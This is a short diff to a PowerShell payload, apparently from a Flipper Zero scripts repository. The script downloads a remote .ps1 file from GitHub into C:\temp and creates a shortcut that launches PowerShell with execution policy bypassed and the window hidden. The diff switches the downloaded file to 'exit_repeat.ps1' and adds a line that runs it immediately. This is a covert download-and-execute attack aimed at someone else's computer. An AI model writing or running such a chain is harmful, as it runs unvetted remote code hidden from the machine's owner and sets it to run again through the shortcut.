@@ -1,6 +1,6 @@
 $FilePath = "C:\temp\file.ps1"
 
-$myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/Steam-Exit/tst.ps1"
+$myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/Steam-Exit/exit_repeat.ps1"
 Invoke-WebRequest $myDownloadUrl -OutFile $FilePath
 
 
@@ -15,3 +15,5 @@ $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$Scri
 $Shortcut.IconLocation = $WindowsPowerShell
 $Shortcut.WorkingDirectory = (Get-Item $WindowsPowerShell).DirectoryName
 $Shortcut.Save()
+
+& "C:/temp/file.ps1"
